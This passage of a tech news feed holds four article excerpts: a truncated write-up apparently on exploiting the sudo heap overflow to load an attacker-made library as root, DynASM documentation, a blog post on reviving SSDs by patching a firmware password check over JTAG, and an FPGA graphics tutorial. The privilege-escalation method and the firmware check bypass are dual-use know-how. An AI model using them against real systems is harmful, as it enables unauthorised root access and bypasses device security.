In the inner for loop we run into the if statement at ´"\\“´ and by that skipping one char by <code>from++</code> the backslash and only inserting the null jumping onto the next ´”\\“´ and consequently inserting two null bytes in a row.</p>
<h2 id="exploitation">Exploitation</h2>
<p>While the authors mention 3 possible targets here in this writeup we will only cover the second one.</p>
<p>Reasons:</p>
<ul>
<li>no brute-force involved in contrast to the first option where they partially overflow a function pointer defeating ASLR with brute-force.</li>
<li>They state that they did it successfully for 3 operating systems where both the other two were only one.</li>
</ul>
<p>In the second option we try to overflow into a <code>service_user</code> struct stored on the heap.</p>
<div><pre><code data-lang="C"><span>typedef</span> <span>struct</span> service_user
{
  <span>/* And the link to the next entry.  */</span>
  <span>struct</span> service_user <span>*</span>next;
  <span>/* Action according to result.  */</span>
  lookup_actions actions[<span>5</span>];
  <span>/* Link to the underlying library object.  */</span>
  service_library <span>*</span>library;
  <span>/* Collection of known functions.  */</span>
  <span>void</span> <span>*</span>known;
  <span>/* Name of the service (`files', `dns', `nis', ...).  */</span>
  <span>char</span> name[<span>0</span>];
} service_user;
</code></pre></div><p>This struct is used in the <code>nss_load_library</code> of libc quite often after the overflow happens for loading new dynamically linked libraries, and can we overflow the name filed then we control what library to load.
Then we can target some non privileged library we can craft that will run with the privileges of root. :-)</p>
<p>The function looks like this:</p>
<div><pre><code data-lang="C"><span>static</span> <span>int</span>
<span>nss_load_library</span> (service_user <span>*</span>ni)
{
  <span>if</span> (ni<span>-&gt;</span>library <span>==</span> NULL)
    {
      <span>static</span> name_database default_table;
      ni<span>-&gt;</span>library <span>=</span> nss_new_service (service_table <span>?:</span> <span>&amp;</span>default_table,
				     ni<span>-&gt;</span>name);
      <span>if</span> (ni<span>-&gt;</span>library <span>==</span> NULL)
	<span>return</span> <span>-</span><span>1</span>;
    }

  <span>if</span> (ni<span>-&gt;</span>library<span>-&gt;</span>lib_handle <span>==</span> NULL)
    {
      <span>/* Load the shared library.  */</span>
      size_t shlen <span>=</span> (<span>7</span> <span>+</span> strlen (ni<span>-&gt;</span>name) <span>+</span> <span>3</span>
		      <span>+</span> strlen (__nss_shlib_revision) <span>+</span> <span>1</span>);
      <span>int</span> saved_errno <span>=</span> errno;
      <span>char</span> shlib_name[shlen];

      <span>/* Construct shared object name.  */</span>
      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
					      <span>"libnss_"</span>),
				    ni<span>-&gt;</span>name),
			  <span>".so"</span>),
		__nss_shlib_revision);

      ni<span>-&gt;</span>library<span>-&gt;</span>lib_handle <span>=</span> __libc_dlopen (shlib_name);
      <span>//continue long long function
</span></code></pre></div><p>The goal with this function is to hit the <code>ni-&gt;library-&gt;lib_handle = __libc_dlopen(shlib_name)</code> loading a new library we control.</p>
<p>Here there are two things to be aware of the first the one mentioned in the article.
If <code>ni-&gt;library</code> is not <code>NULL</code> we will use that pointer in the <code>ni-&gt;library-&gt;lib_handle</code> and as ASLR is a bitch we can’t predict a valid pointer without a leak which we don’t have.
Fortunately there is a initial case for this struct where if this is null we set it by <code>ni-&gt;library = nss_new_service (...</code>. Now the multiple null byte write comes in handy!</p>
<p>Then we just need to overflow this struct all the way to it’s name field to change it to an unprivileged library we control.</p>
<p>The second challenge is that we have this next pointer <code>struct service_user *next;</code> inside the struct forming a linked list that will be traversed when the loading happens.
So if we accidentally overflow another <code>service_user</code> struct in the process we will write a garbage pointer if we overflow with fx A’s leading to a seg fault.
This can be circumvented by inserting null bytes in that spot but that creates another problem, we now break the linked list and our target struct could now be completely removed from the list leaving no pointers to it in the entire memory space.</p>
<p>This means that we have to target the first struct in the linked list that comes after our allocated area.
This turned out to be the biggest challenge to overcome as you can imagine this requires pretty good control of the heap allocation.</p>
<p>In the article they target a <code>service_user</code> with the name <code>systemd</code> which we by no means were able to target.
So we set a breakpoint just before the allocation to inspect the linked list. Then we search for <code>systemd</code> and traverse the list backwards until we find the first <code>service_user</code> close to our allocation. (Combined with some trial and error overflowing of A’s to see what struct it crashes on :-))</p>
<p>Here I show the different <code>service_user</code> names in memory and below vmmaps listed in same order. As seen on the picture the second vmmap corresponds to a systemd in the …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.kalmarunionen.dk/writeups/sudo/">https://www.kalmarunionen.dk/writeups/sudo/</a></em></p>]]>
            </description>
            <link>https://www.kalmarunionen.dk/writeups/sudo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25999667</guid>
            <pubDate>Tue, 02 Feb 2021 11:16:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Unofficial DynASM Documentation]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25998833">thread link</a>) | @lelf
<br/>
February 2, 2021 | https://corsix.github.io/dynasm-doc/index.html | <a href="https://web.archive.org/web/*/https://corsix.github.io/dynasm-doc/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <p>DynASM is a preprocessor and tiny runtime library for creating assemblers and JIT compilers in C or C++.</p>
        <p>DynASM was written for, and is maintained as part of, <a href="http://luajit.org/">LuaJIT</a>. LuaJIT 1 used
           DynASM in a JIT role. LuaJIT 2 doesn't use DymASM in a JIT role, but LuaJIT 2's interpreter is hand-written in assembly,
           and it uses DynASM as a powerful cross-platform assembler.</p>
        <p>To get the latest copy of DymASM, run the following:</p>
        <pre><span>git clone http://luajit.org/git/luajit-2.0.git</span>
<span>cd luajit-2.0/dynasm</span></pre>
        <p>The <a href="http://luajit.org/dynasm.html">official documentation</a> for DynASM is extremely spartan, which can
           make it difficult to get started with DynASM. For using DynASM in a JIT role, this unofficial documentation's
           <strong><a href="https://corsix.github.io/dynasm-doc/tutorial.html">tutorial</a></strong> is recommended as a starting point. Once you're more familiar with DynASM,
           the <strong><a href="https://corsix.github.io/dynasm-doc/reference.html">reference</a></strong> and <strong><a href="https://corsix.github.io/dynasm-doc/instructions.html">instruction listing</a></strong>
           pages are recommended reading for fleshing out your DynASM knowledge.</p>
        <p>Note that DynASM supports the x86, x64, ARM, PowerPC, and MIPS instruction sets, but this unofficial documentation
           only covers x86 and x64.</p>
      </div></div>]]>
            </description>
            <link>https://corsix.github.io/dynasm-doc/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25998833</guid>
            <pubDate>Tue, 02 Feb 2021 09:14:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fixing a Bricked SSD with JTAG]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25998328">thread link</a>) | @drudru11
<br/>
February 1, 2021 | https://fmad.io/blog-ssd-bricked-restore.html | <a href="https://web.archive.org/web/*/https://fmad.io/blog-ssd-bricked-restore.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<p>
				SSD`s are the life blood of our fmadio 10G, 40G, 100G ethernet capture systems. They provide backing storage that well exceeds that of conventional RAM, are super fast and light weight. Thus its prudent to keep the SSD farms in top nick, optimal health, and occasionally perform emergency room brain surgery on them. Unfortunately today is one of those days.
			</p>
			<br>

			<div>                        
				<ul>                            
					<li><img width="60%" src="https://fmad.io/images/blog/20141229_ssd_jtag_close.jpg" alt="ssd connected to jtag"></li>
				</ul>                        
			</div>


		<p>
As with all things, it happened late on a Friday night when I was adding a new feature to the system that wipes all capture data from the system. This is simple button click on the web UI page as our clients data is quite sensitive thus needs to be deleted when the box moves internally or externally. The wipe is implemented using the "Secure Erase" ATA-8 command, you can read all about it <a href="https://ata.wiki.kernel.org/index.php/ATA_Secure_Erase">here</a>. Its essentially a restore-to-factory-setting operation. Meaning after the SecureErase the drive`s internal state is the same as "just left the factory". 
		</p>
		
		<p>
Which is great when it works, but this kind of low level drive formatting is pretty complicated with many (presumably) asynchronous operations going on in parallel... and doing 100 of these operations back to back at high speed is probably something the vendor did not expect (I was testing dammit!). In our case this bricked 6 SSD`s rendering them completely useless causing myself quite the stress as I now have several thousand dollars worth of inventory destroyed!  - not a good day.
</p>


				<p><img width="1024px" src="https://fmad.io/images/blog/money_burn.jpg" alt="fmadio ssd lost"></p><p>
The result is a wall of rather intimidating errors indicating imminent doom with the disk is for all intensive purposes <a href="https://en.wikipedia.org/wiki/Brick_%28electronics%29"><b>BRICKED</b></a>.

<code>

kernel: [18633.754193] ata2.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0
kernel: [18633.754204] ata2.00: irq_stat 0x40000001
kernel: [18633.754206] ata2.00: failed command: READ DMA
kernel: [18633.754209] ata2.00: cmd c8/00:08:00:00:00/00:00:00:00:00/e0 tag 0 dma 4096 in
kernel: [18633.754209]          res 51/04:00:00:00:00/00:00:00:00:00/60 Emask 0x1 (device error)
kernel: [18633.754210] ata2.00: status: { DRDY ERR }
kernel: [18633.754211] ata2.00: error: { ABRT }
kernel: [18633.754515] ata2.00: supports DRM functions and may not be fully accessible
kernel: [18633.754614] ata2.00: failed to get NCQ Send/Recv Log Emask 0x1
kernel: [18633.759150] ata2.00: supports DRM functions and may not be fully accessible
kernel: [18633.759215] ata2.00: failed to get NCQ Send/Recv Log Emask 0x1
kernel: [18633.763495] ata2.00: configured for UDMA/133
kernel: [18633.770136] ata2: EH complete
kernel: [18633.770278] ata2.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0
kernel: [18633.770280] ata2.00: irq_stat 0x40000001
kernel: [18633.770281] ata2.00: failed command: READ DMA
kernel: [18633.770284] ata2.00: cmd c8/00:08:00:00:00/00:00:00:00:00/e0 tag 1 dma 4096 in
kernel: [18633.770284]          res 51/04:00:00:00:00/00:00:00:00:00/60 Emask 0x1 (device error)
kernel: [18633.770286] ata2.00: status: { DRDY ERR }
kernel: [18633.770286] ata2.00: error: { ABRT }
kernel: [18633.770572] ata2.00: supports DRM functions and may not be fully accessible
kernel: [18633.770641] ata2.00: failed to get NCQ Send/Recv Log Emask 0x1
kernel: [18633.775164] ata2.00: supports DRM functions and may not be fully accessible
kernel: [18633.775210] ata2.00: failed to get NCQ Send/Recv Log Emask 0x1
kernel: [18633.779527] ata2.00: configured for UDMA/133
kernel: [18633.786094] ata2: EH complete
kernel: [18633.786205] ata2.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0
kernel: [18633.786207] ata2.00: irq_stat 0x40000001
kernel: [18633.786208] ata2.00: failed command: READ DMA
</code>


</p><p>
The usual suspects to recover were tried and failed, leaving only a few options.
<br>
</p>

<h5>a) RMA the boards back to the seller<br>
b) Contact vendor support<br>
c) Perform surgery</h5>


<p>
Option a) of RMA`ing the boards was the safest option, tho usually you get some other previously recycled RMA`ed device back. Option b) of contacting the vendor is always such a brutally painful experience. It would likely end up with some random "Customer Support" person with a strange accent... giving the default completely useless response of RMA the device and get a replacement kind of thing... ho hum. Which leaves surgery! Now I usually don't go messing with hardware like this (anymore... :) ) because it takes up quite a bit time. However SSD health and prosperity is directly linked to our profitability thus deemed it a worth while time investment to have a more intimate relationship with our SSD models of choice. 
</p>
<br>

<div><p>
The process starts with a general reconnaissance mission of what pins are accessible, and what those pins are for. First up was finding the UART / serial interface but it was silent and likely disabled by the firmware. Next up was what most likely looked like a JTAG interface and... bingo, full JTAG interface connecting and operating as expected.
</p><p>

 JTAG is a hardware based system debugger that for CPU`s let you control instruction execution and read/write memory anywhere. You can see in the picture below some soldering of header pins was required, that is then wired to a breadboard which is wired to a Raspberry PI.
</p></div>


	<p><img width="1024px" src="https://fmad.io/images/blog/20141229_ssd_jtag.jpg" alt="fmadio ssd with jtag connected"></p><div><p>
Raspberry PI? wtf ? In this case the Raspberry PI was converted into a JTAG debugger using the outstanding software over at <a href="http://openocd.sourceforge.net/">OpenOCD</a>. As "real" JTAG debuggers are quite expensive ranging from $100 - $1000+ making OCD coupled with the PI an excellent low cost alternative. 
</p><p>

At this point you get a small rush as you gain access and poke the device, after which the vastness of having no idea what anything does starts to weigh you down. Then slowly bit by bit, instruction after instruction, string after string you gain some intuition on the memory map, what the code does, how its setup and eventually find something interesting.
</p></div> 

<p>

The first entry point to look for is the classic printf / trace / debug operation which gives you insight into what the software is doing. And eventually managed to track down the code that`s basically

<code>
void trace(char* Message, ...)
{ 
	va_arg list;
	va_start(arglist, Message);

	char buf[1024];
	vsprintf(buf, Message, arglist);

	if (debug_enable)
	{
		fwrite(output, buf, strlen(buf));
	}
}
</code>

which writes out a string to a console to tell the developer on whats going on. Note that the code has to "flatten" the string first before even deciding to output or not, which gives us a nice window to sniff the string with JTAG even if nothing is written to the console. 
</p>


<p>
After sniffing strings for a while and getting a better feel for whats happening noticed that the SSD is receiving commands from the SATA host no problem. But there`s some sort of funkyness going on that causes the SSD to send no response back - kind of a one-way-street. One idea to resolve this is: in theory the security erase operation restores everything back to good health. The question tho, is the device actually processing a security erase request ?  
</p>


<p>
... and using our printf JTAG sniffer... it most certainly is processing the request! But failing miserably due to an incorrect password. You can see the sniffed printf jtag string in the output below. Hint: <i>"&lt;SED&gt; Credential Comparison Failed"</i> ASCIIZ string.
</p>


	<p><img width="1024px" src="https://fmad.io/images/blog/20141229_ssd_security_erase_fail.jpg" alt="fmadio ssd security erase fail"></p><p>
Which makes it clear why the security erase / factory reset failed but more importantly you can track down the offending bit of code from this string. That results in the following snippet of assembler courtesy of the IDA toolset below.
</p> 

<p><img width="1024px" src="https://fmad.io/images/blog/20141229_ssd_security_check.jpg" alt="fmadio ssd security erase password check"></p><p>
To decode that for you its doing a 32 byte long compare against some expected cryptographic hash key. Then the <i>"magic compare"</i> aka instruction <b>CMP R5, #1</b> is testing if the keys matched. Then doing a conditional jump to a printf routine based on that comparison result <b>BLNE sub_80...</b>. And finally  the functions return value is the result of the comparison <b>MOV R0, R5</b>. Nothing particularly fancy going on.
</p> 


<p>
There`s a few ways to go from here. One would be to reverse engineer how the 32B key is generated and create  a general purpose exploit. The other would be to just patch the binary such that it thinks it passed the security check. eg Fake a correct password response. We chose the latter as it only takes a few minutes and all I want is to restore the SSD farm`s health. Patching the binary with JTAG is trivial, console output is shown below.
</p> 


<p><img width="1024px" src="https://fmad.io/images/blog/20141229_ssd_security_erase_patch.jpg" alt="fmadio ssd security erase password fake"></p><div><p>
The above shows disassembling the patched code first, the "before" section. This is to check we overwrite the correct bit of code. Then patch it using the command <b>cpu0 arm mww</b> with the value 0xe3a05001. Then disassemble again "after section" to confirm the patch worked and has the correct instruction. 
</p><p>

In this case we replaced <b>BLNE</b> instruction (print error message to the console) with <b>MOV r5, #1</b> at address 0x8009abe4 (shown in blue). The result of the "magic check" is 0 for fail, 1 for pass and write it to register r5. All we did is ignore the whole comparison and simply override it and say the security check always passes (r5 = 1).
</p></div> 

<p>
...
</p>

<p>
Now its patched, with cpu`s resumed its the moment of truth. Issuing the security erase operation from the host system via hdparm. 
<br>
<code>
$ sudo hdparm --security-erase 1234  /dev/sdb
security_password="1234"

/dev/sdb:
 Issuing SECURITY_ERASE command, password="1234, user=user
$
</code>
<br>
... and it worked! the SSD is back to life, working as normal and running at high speed!  ... with <b>several thousand dollars worth of SSD`s back in business</b> making our 10G, 40G, 100G network capture systems more resilient than ever. Now if the SSD vendor (who shall remain nameless) would fix the dam bug so excessive back-to-back security password/erase does NOT brick the device, life would be so much better. 
</p>


	</div></div>]]>
            </description>
            <link>https://fmad.io/blog-ssd-bricked-restore.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25998328</guid>
            <pubDate>Tue, 02 Feb 2021 07:51:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring FPGA Graphics (2020)]]>
            </title>
            <description>
<![CDATA[
Score 134 | Comments 38 (<a href="https://news.ycombinator.com/item?id=25998154">thread link</a>) | @rbanffy
<br/>
February 1, 2021 | https://projectf.io/posts/fpga-graphics/ | <a href="https://web.archive.org/web/*/https://projectf.io/posts/fpga-graphics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>Welcome to <em>Exploring FPGA Graphics</em>. In this series, we explore graphics at the hardware level and get a feel for the power of FPGAs. We start by learning how displays work, before racing the beam with Pong, starfields and sprites, simulating life with bitmaps, drawing lines and triangles, and finally creating simple 3D models. I’ll be writing and revising this series throughout 2020 and 2021.</p>
<p>In this first post, we learn how computer displays work and animate simple shapes with an FPGA.</p>
<p><em>Updated 2021-01-28. Get in touch with <a href="https://twitter.com/WillFlux">@WillFlux</a> or open an <a href="https://github.com/projf/projf-explore/issues">issue on GitHub</a>.</em></p>
<blockquote>
<p>In all beginnings dwells a magic force<br>
<em>Herman Hesse, Stages from <a href="https://en.wikipedia.org/wiki/The_Glass_Bead_Game">The Glass Bead Game</a></em></p>
</blockquote>
<h3 id="series-outline">Series Outline</h3>
<ul>
<li>Exploring FPGA Graphics (this post) - learn how displays work and animate simple shapes</li>
<li><a href="https://projectf.io/posts/fpga-pong/">FPGA Pong</a> - race the beam to create the arcade classic</li>
<li><a href="https://projectf.io/posts/hardware-sprites/">Hardware Sprites</a> - fast, colourful, graphics with minimal resources</li>
<li><a href="https://projectf.io/posts/fpga-ad-astra/">FPGA Ad Astra</a> - demo with hardware sprites and animated starfields</li>
<li><a href="https://projectf.io/posts/framebuffers/">Framebuffers</a> - driving the display from a bitmap in memory</li>
<li><a href="https://projectf.io/posts/life-on-screen/">Life on Screen</a> - the screen comes alive with Conway’s Game of Life</li>
<li><a href="https://projectf.io/posts/lines-and-triangles/">Lines and Triangles</a> - drawing lines and triangles with a framebuffer</li>
</ul>
<p><em>More parts to follow.</em></p>
<h3 id="requirements">Requirements</h3>
<p>For this series, you need an FPGA board with video output. We’ll be working at 640x480, so pretty much any video output will work. It helps to be comfortable with programming your FPGA board and reasonably familiar with Verilog.</p>
<p>We’ll be demoing the designs with two boards:</p>
<ul>
<li><strong><a href="https://docs.icebreaker-fpga.org/hardware/icebreaker/">iCEBreaker</a></strong> (Lattice iCE40) with <strong><a href="https://docs.icebreaker-fpga.org/hardware/pmod/dvi/">12-Bit DVI Pmod</a></strong></li>
<li><strong><a href="https://reference.digilentinc.com/reference/programmable-logic/arty-a7/reference-manual">Digilent Arty A7-35T</a></strong> (Xilinx Artix-7) with <strong><a href="https://reference.digilentinc.com/reference/pmod/pmodvga/reference-manual">Pmod VGA</a></strong></li>
</ul>
<h3 id="source">Source</h3>
<p>The SystemVerilog designs featured in this series are available from the <a href="https://github.com/projf/projf-explore/">projf-explore</a> repo on GitHub. The designs are open source hardware under the permissive MIT licence, but this blog is subject to normal copyright restrictions.</p>
<blockquote>
<p><strong>Quick Aside: SystemVerilog?!</strong><br>
We’ll be using a few choice features from SystemVerilog to make Verilog a little more pleasant (no laughing at the back). If you’re familiar with Verilog, you’ll have no trouble.</p>
</blockquote>
<h2 id="space-and-time">Space and Time</h2>
<p>The screen you’re looking at is a little universe with its own rules of space and time.</p>
<p>Looking at a screen from afar, you see a smooth two-dimensional image. Look more closely, and you see many individual blocks: these are <strong>pixels</strong>, made up of red, green, and blue components. A typical high-definition image is 1920 pixels across and 1080 lines down: over 2 million pixels in total. Even a 640x480 image has over 300,000 pixels. The need to handle so much information so quickly is a big part of the challenge of working with graphics at a hardware level.</p>
<p>A VGA cable has five main signals: red, green, blue, horizontal sync, and vertical sync. There are no addressing signals to tell the screen where to draw pixels; the secret is time, defined by the sync signals. The red, green, and blue wires carry the colour of each pixel in turn. Each pixel lasts a fixed length of time; when the display receives a <strong>horizontal sync</strong>, it starts a new line; when it receives a <strong>vertical sync</strong>, it begins a new frame. Showing many frames in quick succession provides the illusion of a moving image.</p>
<p>The sync signals are part of <strong>blanking</strong> intervals. Originally designed to allow an electron gun to move to the next line or top of the screen, blanking intervals have been retained and repurposed in contemporary displays: HDMI uses them to transmit audio. The blanking interval has three parts: <strong>front porch</strong>, <strong>sync</strong>, and <strong>back porch</strong>.</p>
<p><img src="https://projectf.io/img/posts/fpga-graphics/display-timings.png" alt="Display Timings" title="Display Timings"></p>
<h2 id="display-timings">Display Timings</h2>
<p>In this series, we’re going to use <strong>640x480</strong> as our display resolution. Almost all displays support 640x480, and its low resource requirements make it simple to work with on small FPGAs. All the same principles apply at higher resolutions, such as 1280x720 or 4K.</p>
<p>We’ll use traditional horizontal and vertical timings, based on the original VGA monitor and adapter:</p>
<div><pre><code data-lang="plaintext">    640x480 Timings      HOR    VER
    -------------------------------
    Active Pixels        640    480
    Front Porch           16     10
    Sync Width            96      2
    Back Porch            48     33
    Blanking Total       160     45
    Total Pixels         800    525
    Sync Polarity        neg    neg
</code></pre></div><p><em>Learn more from <a href="https://projectf.io/posts/video-timings-vga-720p-1080p/">Video Timings: VGA, SVGA, 720p, 1080p</a>.</em></p>
<p>Taking blanking into account, we have a total of 800x525 pixels. A typical LCD refreshes 60 times a second, so the number of pixels per second is <code>800 x 525 x 60 = 25,200,000</code>, which equates to a <strong>pixel clock</strong> of 25.2 MHz.</p>
<blockquote>
<p><strong>CAUTION: CRT Monitors</strong><br>
Any modern display, including <a href="https://en.wikipedia.org/wiki/Multisync_monitor">multisync CRTs</a>, should be fine with a 25.2 or 25 MHz pixel clock. Fixed-frequency CRTs, such as the original IBM 85xx series, could be damaged by an out-of-spec signal. Use these designs at your own risk.</p>
</blockquote>
<h2 id="running-to-time">Running to Time</h2>
<p>We’ve decided we need a pixel clock of 25.2 MHz pixel clock, but neither of our demo boards has such a clock. To reach the required frequency, we’re going to use a <strong><a href="https://en.wikipedia.org/wiki/Phase-locked_loop">phase-locked loop</a></strong> (PLL). Almost all FPGAs include one or more PLLs, but there isn’t a standard way to configure them in Verilog, so we have to use vendor-specific designs.</p>
<p>We have provided implementations for Xilinx 7 Series (XC7) and Lattice iCE40; for other FPGAs, you’ll need to consult your vendor documentation. If you can’t reach 25.2 MHz exactly, then 25 MHz or thereabouts should be fine (but see note about CRTs, above). The iCE40 can’t generate 25.2 MHz using the oscillators on iCEBreaker but works fine at 25.125 MHz.</p>
<h3 id="clock-generator-modules">Clock Generator Modules</h3>
<ul>
<li>Xilinx 7 Series: <strong><a href="https://github.com/projf/projf-explore/blob/master/common/xc7/clock_gen.sv">xc7/clock_gen.sv</a></strong></li>
<li>Lattice iCE40: <strong><a href="https://github.com/projf/projf-explore/blob/master/common/ice40/clock_gen.sv">ice40/clock_gen.sv</a></strong></li>
</ul>
<h2 id="display-timings-module">Display Timings Module</h2>
<p>Using our ~25 MHz pixel clock, we can generate timings for our 640x480 display. Creating display timings is straightforward: there’s one counter for horizontal position and one for vertical. We use these counters to decide on the correct time for sync signals.</p>
<p>640x480 display timings generator <strong>[<a href="https://github.com/projf/projf-explore/blob/master/common/display_timings_480p.sv">display_timings_480p.sv</a>]</strong>:</p>
<div><pre><code data-lang="verilog"><span>module</span> display_timings_480p (
    <span>input</span>  <span>wire</span> <span>logic</span> clk_pix,   <span>// pixel clock
</span><span></span>    <span>input</span>  <span>wire</span> <span>logic</span> rst,       <span>// reset
</span><span></span>    <span>output</span>      <span>logic</span> [<span>9</span><span>:</span><span>0</span>] sx,  <span>// horizontal screen position
</span><span></span>    <span>output</span>      <span>logic</span> [<span>9</span><span>:</span><span>0</span>] sy,  <span>// vertical screen position
</span><span></span>    <span>output</span>      <span>logic</span> hsync,     <span>// horizontal sync
</span><span></span>    <span>output</span>      <span>logic</span> vsync,     <span>// vertical sync
</span><span></span>    <span>output</span>      <span>logic</span> de         <span>// data enable (low in blanking interval)
</span><span></span>    );

    <span>// horizontal timings
</span><span></span>    <span>parameter</span> HA_END <span>=</span> <span>639</span>;           <span>// end of active pixels
</span><span></span>    <span>parameter</span> HS_STA <span>=</span> HA_END <span>+</span> <span>16</span>;   <span>// sync starts after front porch
</span><span></span>    <span>parameter</span> HS_END <span>=</span> HS_STA <span>+</span> <span>96</span>;   <span>// sync ends
</span><span></span>    <span>parameter</span> LINE   <span>=</span> <span>799</span>;           <span>// last pixel on line (after back porch)
</span><span></span>
    <span>// vertical timings
</span><span></span>    <span>parameter</span> VA_END <span>=</span> <span>479</span>;           <span>// end of active pixels
</span><span></span>    <span>parameter</span> VS_STA <span>=</span> VA_END <span>+</span> <span>10</span>;   <span>// sync starts after front porch
</span><span></span>    <span>parameter</span> VS_END <span>=</span> VS_STA <span>+</span> <span>2</span>;    <span>// sync ends
</span><span></span>    <span>parameter</span> SCREEN <span>=</span> <span>524</span>;           <span>// last line on screen (after back porch)
</span><span></span>
    <span>always_comb</span> <span>begin</span>
        hsync <span>=</span> <span>~</span>(sx <span>&gt;=</span> HS_STA <span>&amp;&amp;</span> sx <span>&lt;</span> HS_END);  <span>// invert: negative polarity
</span><span></span>        vsync <span>=</span> <span>~</span>(sy <span>&gt;=</span> VS_STA <span>&amp;&amp;</span> sy <span>&lt;</span> VS_END);  <span>// invert: negative polarity
</span><span></span>        de <span>=</span> (sx <span>&lt;=</span> HA_END <span>&amp;&amp;</span> sy <span>&lt;=</span> VA_END);
    <span>end</span>

    <span>// calculate horizontal and vertical screen position
</span><span></span>    <span>always_ff</span> @ (<span>posedge</span> clk_pix) <span>begin</span>
        <span>if</span> (sx <span>==</span> LINE) <span>begin</span>  <span>// last pixel on line?
</span><span></span>            sx <span>&lt;=</span> <span>0</span>;
            sy <span>&lt;=</span> (sy <span>==</span> SCREEN) <span>?</span> <span>0</span> <span>:</span> sy <span>+</span> <span>1</span>;  <span>// last line on screen?
</span><span></span>        <span>end</span> <span>else</span> <span>begin</span>
            sx <span>&lt;=</span> sx <span>+</span> <span>1</span>;
        <span>end</span>
        <span>if</span> (rst) <span>begin</span>
            sx <span>&lt;=</span> <span>0</span>;
            sy <span>&lt;=</span> <span>0</span>;
        <span>end</span>
    <span>end</span>
<span>endmodule</span>
</code></pre></div><p><em>ProTip: The last assignment wins in Verilog, so the reset overrides the existing <code>sx</code> and <code>sy</code>.</em></p>
<p><strong>sx</strong> and <strong>sy</strong> store the horizontal and vertical position; their maximum values are 800 and 525 respectively, so we need 10 bits to hold them (2<sup>10</sup> = 1024). <strong>de</strong> is <em>data enable</em>, which is low during the blanking interval: we use it to decide when to draw pixels.</p>
<p>Display modes vary in the polarity of their sync signals; for traditional 640x480, the polarity is negative for both <strong>hsync</strong> and <strong>vsync</strong>. Negative polarity means the voltage is mostly high, with low voltage indicating a sync signal.</p>
<p>The following simulation shows the vertical sync starting at the 490th line (counting starts at zero):</p>
<p><img src="https://projectf.io/img/posts/fpga-graphics/hsync-vsync-vga.png" alt="Sync Signal Simulation" title="Simulating VGA horizontal &amp; vertical sync signals"></p>
<h2 id="test-benches">Test Benches</h2>
<p>You can exercise the designs with the included test benches (Xilinx only):</p>
<ul>
<li><strong><a href="https://github.com/projf/projf-explore/tree/master/common/xc7/clock_gen_tb.sv">Clock Gen Test Bench</a></strong> (Xilinx 7 Series)</li>
<li><strong><a href="https://github.com/projf/projf-explore/tree/master/common/xc7/display_timings_tb.sv">Display Timings Test Bench</a></strong> (Xilinx 7 Series)</li>
</ul>
<p>Some things to check:</p>
<ul>
<li>What is the pixel clock period?</li>
<li>How long does the pixel clock take to lock?</li>
<li>Does a frame last exactly 1/60th of a second?</li>
<li>How much time does a single line last?</li>
<li>What is the maximum values of <code>sx</code> and <code>sy</code> when <code>de</code> is low?</li>
</ul>
<p><em>You can find instructions for running the simulation in the source <a href="https://github.com/projf/projf-explore/tree/master/fpga-graphics">README</a>.</em></p>
<h2 id="top-display">Top Display</h2>
<p>Now we have our display signals we’re ready to start drawing. To begin, we’re going to keep it simple and draw a coloured square. When the screen x and y coordinates are both less than 32 we draw in orange; otherwise, we use blue. Because our colour output has 4 bits per channel, we can use a single hex digit from 0-F to represent the intensity of red, green, and blue.</p>
<p>There are two versions of this top module, one for each demo board:</p>
<ul>
<li>Xilinx XC7: <strong><a href="https://github.com/projf/projf-explore/blob/master/fpga-graphics/xc7/top_square.sv">xc7/top_square.sv</a></strong></li>
<li>Lattice iCE40: <strong><a href="https://github.com/projf/projf-explore/blob/master/fpga-graphics/ice40/top_square.sv">ice40/top_square.sv</a></strong></li>
</ul>
<h3 id="arty-vga">Arty VGA</h3>
<p>Shown below is the version for Arty A7-35T (XC7) with Pmod VGA:</p>
<div><pre><code data-lang="verilog"><span>module</span> top_square (
    <span>input</span>  <span>wire</span> <span>logic</span> clk_100m,     <span>// 100 MHz clock
</span><span></span>    <span>input</span>  <span>wire</span> <span>logic</span> btn_rst,      <span>// reset button (active low)
</span><span></span>    <span>output</span>      <span>logic</span> vga_hsync,    <span>// horizontal sync
</span><span></span>    <span>output</span>      <span>logic</span> vga_vsync,    <span>// vertical sync
</span><span></span>    <span>output</span>      <span>logic</span> [<span>3</span><span>:</span><span>0</span>] vga_r,  <span>// 4-bit VGA red
</span><span></span>    <span>output</span>      <span>logic</span> [<span>3</span><span>:</span><span>0</span>] vga_g,  <span>// 4-bit VGA green
</span><span></span>    <span>output</span>      <span>logic</span> [<span>3</span><span>:</span><span>0</span>] vga_b   <span>// 4-bit VGA blue
</span><span></span>    );

    <span>// generate pixel clock
</span><span></span>    <span>logic</span> clk_pix;
    <span>logic</span> clk_locked;
    clock_gen clock_640x480 (
       .clk(clk_100m),
       .rst(<span>!</span>btn_rst),  <span>// reset button is active low
</span><span></span>       .clk_pix,
       .clk_locked
    );

    <span>// display timings
</span><span></span>    <span>localparam</span> CORDW <span>=</span> <span>10</span>;  <span>// screen coordinate width in bits
</span><span></span>    <span>logic</span> [CORDW<span>-</span><span>1</span><span>:</span><span>0</span>] sx, sy;
    <span>logic</span> hsync, vsync, de;
    …</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://projectf.io/posts/fpga-graphics/">https://projectf.io/posts/fpga-graphics/</a></em></p>]]>
            </description>
            <link>https://projectf.io/posts/fpga-graphics/</link>
